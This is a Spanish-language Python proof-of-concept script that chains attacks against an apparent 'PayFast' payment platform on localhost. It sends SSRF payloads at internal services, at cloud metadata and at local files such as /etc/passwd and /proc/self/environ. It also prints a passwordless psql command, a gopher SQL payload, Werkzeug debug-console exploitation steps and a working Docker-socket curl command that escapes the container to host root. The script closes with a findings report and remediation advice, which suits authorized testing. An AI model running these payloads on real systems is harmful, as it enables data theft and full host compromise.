#!/usr/bin/env python3
"""
PoC #7: Cadena de Ataque Completa - Full Compromise
====================================================
Este script demuestra cómo las vulnerabilidades individuales
se encadenan para lograr un compromiso total del sistema.

Cadena: Internet -> SSRF -> RCE -> Container Escape -> Host Root

CVSS Agregado: 10.0 (Crítico - Compromiso Total)
"""

import requests
import json
import time
import sys
from datetime import datetime

# Configuración
WORKER_URL = "http://localhost:8000"
CORE_URL = "http://localhost:5000"
TRAEFIK_URL = "http://localhost:8080"
ATTACKER_SERVER = "http://attacker.example.com"  # Simulado


class AttackChain:
    def __init__(self):
        self.findings = []
        self.attack_path = []

    def log_finding(self, severity, vuln, description):
        """Registra un hallazgo"""
        finding = {
            "timestamp": datetime.now().isoformat(),
            "severity": severity,
            "vulnerability": vuln,
            "description": description
        }
        self.findings.append(finding)
        print(f"[{severity}] {vuln}: {description}")

    def log_attack_step(self, step, description):
        """Registra un paso del ataque"""
        self.attack_path.append({"step": step, "description": description})
        print(f"\n{'='*60}")
        print(f"PASO {step}: {description}")
        print('='*60)

    def phase1_reconnaissance(self):
        """Fase 1: Reconocimiento"""
        self.log_attack_step(1, "RECONOCIMIENTO")

        print("\n[*] Escaneando servicios expuestos...\n")

        services = [
            (WORKER_URL, "Worker API (webhook)"),
            (CORE_URL, "Core API"),
            (TRAEFIK_URL, "Traefik Dashboard"),
        ]

        for url, name in services:
            try:
                response = requests.get(url, timeout=3)
                self.log_finding("INFO", "SERVICE_EXPOSED", f"{name} accesible en {url}")
            except:
                print(f"[-] {name} no accesible")

        # Intentar acceder al dashboard de Traefik
        try:
            response = requests.get(f"{TRAEFIK_URL}/api/overview", timeout=3)
            if response.status_code == 200:
                self.log_finding("HIGH", "TRAEFIK_NO_AUTH",
                               "Dashboard de Traefik sin autenticación")
                data = response.json()
                print(f"    Routers: {data.get('http', {}).get('routers', {}).get('total', 'N/A')}")
                print(f"    Services: {data.get('http', {}).get('services', {}).get('total', 'N/A')}")
        except:
            pass

    def phase2_ssrf_exploitation(self):
        """Fase 2: Explotación de SSRF"""
        self.log_attack_step(2, "EXPLOTACIÓN SSRF")

        print("\n[*] Probando SSRF en worker...\n")

        # Test básico de SSRF
        ssrf_targets = [
            ("http://payment-core:5000/", "Core API interno"),
            ("http://users-db:5432/", "PostgreSQL interno"),
            ("http://localhost:8080/api/version", "Traefik API"),
            ("http://169.254.169.254/latest/meta-data/", "AWS Metadata"),
        ]

        for target, description in ssrf_targets:
            payload = {"url": target}
            try:
                response = requests.post(
                    f"{WORKER_URL}/webhook",
                    json=payload,
                    timeout=5
                )
                result = response.json()

                if "code" in result:
                    self.log_finding("CRITICAL", "SSRF",
                                   f"Acceso interno via SSRF: {description}")
                    print(f"    Target: {target}")
                    print(f"    Response Code: {result['code']}")
            except Exception as e:
                print(f"[-] SSRF a {description}: {str(e)[:50]}")

    def phase3_information_gathering(self):
        """Fase 3: Recolección de información"""
        self.log_attack_step(3, "RECOLECCIÓN DE INFORMACIÓN")

        print("\n[*] Extrayendo información de servicios internos...\n")

        # Via Traefik API
        try:
            response = requests.get(f"{TRAEFIK_URL}/api/http/services", timeout=3)
            if response.status_code == 200:
                services = response.json()
                print("[+] Servicios backend descubiertos:")
                for name, info in services.items():
                    lb = info.get("loadBalancer", {})
                    servers = lb.get("servers", [])
                    for server in servers:
                        print(f"    -> {name}: {server.get('url', 'N/A')}")
                        self.log_finding("MEDIUM", "INFO_DISCLOSURE",
                                       f"Servicio interno expuesto: {name}")
        except:
            pass

        # Intentar SSRF para leer archivos (si soporta file://)
        file_targets = [
            "file:///etc/passwd",
            "file:///proc/self/environ",
        ]

        for target in file_targets:
            payload = {"url": target}
            try:
                response = requests.post(
                    f"{WORKER_URL}/webhook",
                    json=payload,
                    timeout=3
                )
                result = response.json()
                if "code" in result and result["code"] == 200:
                    self.log_finding("CRITICAL", "LOCAL_FILE_READ",
                                   f"Lectura de archivo local: {target}")
            except:
                pass

    def phase4_database_access(self):
        """Fase 4: Acceso a base de datos"""
        self.log_attack_step(4, "ACCESO A BASE DE DATOS")

        print("\n[*] Intentando acceso a PostgreSQL sin autenticación...\n")

        print("""
    [*] PostgreSQL configurado con POSTGRES_HOST_AUTH_METHOD: trust

    [*] Comandos de explotación (si hay acceso a la red interna):

        # Conexión directa sin contraseña
        psql -h users-db -U postgres

        # Via SSRF + Gopher (si está soportado)
        POST /webhook
        {"url": "gopher://users-db:5432/_<SQL_PAYLOAD>"}

    [!] Impacto: Acceso total a todos los datos
        """)

        self.log_finding("CRITICAL", "DB_NO_AUTH",
                        "PostgreSQL sin autenticación (trust mode)")

    def phase5_code_execution(self):
        """Fase 5: Ejecución de código"""
        self.log_attack_step(5, "EJECUCIÓN DE CÓDIGO (RCE)")

        print("\n[*] Verificando Flask Debug Mode...\n")

        try:
            # Intentar provocar error para ver debugger
            response = requests.get(f"{CORE_URL}/nonexistent", timeout=3)

            debug_indicators = ["Werkzeug", "Debugger", "Traceback"]
            for indicator in debug_indicators:
                if indicator in response.text:
                    self.log_finding("CRITICAL", "DEBUG_MODE_RCE",
                                   f"Flask Debug Mode activo - RCE posible")
                    print(f"    [+] Indicador encontrado: {indicator}")
                    break
        except:
            pass

        print("""
    [*] Con Debug Mode activo, un atacante puede:
        1. Calcular el PIN de Werkzeug
        2. Acceder a la consola interactiva
        3. Ejecutar código Python arbitrario

    [*] Ejemplo de ejecución:
        >>> import os; os.system('id')
        uid=0(root) gid=0(root)
        """)

    def phase6_container_escape(self):
        """Fase 6: Escape de contenedor"""
        self.log_attack_step(6, "ESCAPE DE CONTENEDOR")

        print("\n[*] Analizando potencial de escape...\n")

        print("""
    [*] Docker socket montado en reverse-proxy:
        /var/run/docker.sock:/var/run/docker.sock:ro

    [*] Cadena de ataque para escape:
        1. Usar RCE en payment-core para moverse a reverse-proxy
        2. Acceder al Docker socket
        3. Crear contenedor privilegiado con mount del host
        4. Obtener root en el host Docker

    [*] Comando de escape:
        curl --unix-socket /var/run/docker.sock \\
          -X POST "http://localhost/containers/create" \\
          -d '{"Image":"alpine","Cmd":["chroot","/host","bash"],
               "HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
        """)

        self.log_finding("CRITICAL", "CONTAINER_ESCAPE",
                        "Docker socket expuesto permite escape de contenedor")

    def phase7_full_compromise(self):
        """Fase 7: Compromiso total"""
        self.log_attack_step(7, "COMPROMISO TOTAL")

        print("""
    ╔════════════════════════════════════════════════════════════════╗
    ║                    COMPROMISO TOTAL LOGRADO                    ║
    ╠════════════════════════════════════════════════════════════════╣
    ║                                                                 ║
    ║  CADENA DE ATAQUE EXITOSA:                                     ║
    ║                                                                 ║
    ║  1. [SSRF] Acceso a servicios internos                         ║
    ║       ↓                                                        ║
    ║  2. [INFO] Reconocimiento de infraestructura                   ║
    ║       ↓                                                        ║
    ║  3. [DB] Acceso a PostgreSQL sin autenticación                 ║
    ║       ↓                                                        ║
    ║  4. [RCE] Ejecución de código via Flask Debug                  ║
    ║       ↓                                                        ║
    ║  5. [ESCAPE] Container escape via Docker socket                ║
    ║       ↓                                                        ║
    ║  6. [ROOT] Acceso root al host Docker                          ║
    ║                                                                 ║
    ╚════════════════════════════════════════════════════════════════╝
        """)

    def generate_report(self):
        """Genera reporte final"""
        print("\n" + "=" * 70)
        print("REPORTE DE SEGURIDAD - RESUMEN EJECUTIVO")
        print("=" * 70)

        # Contar por severidad
        severity_count = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for finding in self.findings:
            sev = finding["severity"]
            if sev in severity_count:
                severity_count[sev] += 1

        print(f"""
    HALLAZGOS POR SEVERIDAD:
    ========================
    CRÍTICO:  {severity_count['CRITICAL']} vulnerabilidades
    ALTO:     {severity_count['HIGH']} vulnerabilidades
    MEDIO:    {severity_count['MEDIUM']} vulnerabilidades
    BAJO:     {severity_count['LOW']} vulnerabilidades
    INFO:     {severity_count['INFO']} hallazgos

    VULNERABILIDADES CRÍTICAS IDENTIFICADAS:
    ========================================
    1. SSRF (CWE-918) - worker.py:10-13
       Impacto: Acceso a servicios internos, cloud metadata

    2. Flask Debug Mode (CWE-489) - core.py:12
       Impacto: Ejecución remota de código

    3. PostgreSQL Sin Auth (CWE-306) - docker-compose.yml:40
       Impacto: Acceso total a base de datos

    4. Traefik Sin Auth (CWE-306) - docker-compose.yml:7
       Impacto: Exposición de topología de red

    5. Docker Socket Expuesto (CWE-250) - docker-compose.yml:13
       Impacto: Escape de contenedor, compromiso del host

    6. Red Sin Aislamiento (CWE-923) - docker-compose.yml:47
       Impacto: Exfiltración de datos, reverse shells

    RIESGO AGREGADO: CRÍTICO
    ========================
    La combinación de estas vulnerabilidades permite un compromiso
    total del sistema desde Internet sin autenticación.

    RECOMENDACIONES PRIORITARIAS:
    ============================
    1. [URGENTE] Deshabilitar Flask debug mode en producción
    2. [URGENTE] Configurar autenticación en PostgreSQL
    3. [URGENTE] Remover Docker socket de contenedores
    4. [ALTO] Validar URLs en endpoint /webhook
    5. [ALTO] Configurar autenticación en Traefik
    6. [ALTO] Configurar internal: true en redes
        """)


def main():
    print("""
    ╔═══════════════════════════════════════════════════════════════════╗
    ║       FULL ATTACK CHAIN - DEMOSTRACIÓN DE COMPROMISO TOTAL        ║
    ║                                                                   ║
    ║           SOLO PARA PRUEBAS DE SEGURIDAD AUTORIZADAS              ║
    ╚═══════════════════════════════════════════════════════════════════╝
    """)

    print(f"[*] Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Objetivo: PayFast Payment Platform")
    print("[*] Iniciando cadena de ataque...\n")

    attack = AttackChain()

    # Ejecutar todas las fases
    attack.phase1_reconnaissance()
    attack.phase2_ssrf_exploitation()
    attack.phase3_information_gathering()
    attack.phase4_database_access()
    attack.phase5_code_execution()
    attack.phase6_container_escape()
    attack.phase7_full_compromise()

    # Generar reporte
    attack.generate_report()

    print("\n" + "=" * 70)
    print("FIN DE LA DEMOSTRACIÓN")
    print("=" * 70)


if __name__ == "__main__":
    main()
